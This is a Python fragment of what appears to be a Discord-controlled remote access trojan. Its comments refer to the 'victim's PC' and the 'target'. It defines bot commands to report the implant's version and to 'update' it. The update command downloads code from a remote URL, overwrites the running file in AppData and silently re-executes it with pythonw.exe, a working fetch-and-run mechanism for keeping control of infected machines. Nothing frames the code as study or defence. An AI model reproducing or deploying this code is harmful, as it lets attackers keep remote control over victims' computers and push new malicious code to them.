import requests # Make sure 'requests' is installed on the victim's PC

# --- CONFIGURATION ---
VERSION = "1.0"
# Link to your RAW code on GitHub/Pastebin
UPDATE_URL = "https://your-link-here.com/raw/winsvc.py" 

@bot.command()
async def version(ctx):
    """Checks the current version running on the target."""
    await ctx.send(f"🛰️ Current Version: `{VERSION}`")

@bot.command()
async def update(ctx):
    """Forces the bot to download the latest code from your URL."""
    await ctx.send("♻️ Checking for updates...")
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            new_code = response.text
            # Overwrite the current running file in AppData
            with open(FULL_PATH, "w", encoding="utf-8") as f:
                f.write(new_code)
            
            await ctx.send("✅ Update downloaded. Restarting system service...")
            # Restart the script
            os.execv(sys.executable, ['pythonw.exe'] + sys.argv)
        else:
            await ctx.send("❌ Failed to reach update server.")
    except Exception as e:
        await ctx.send(f"⚠️ Update Error: {e}")
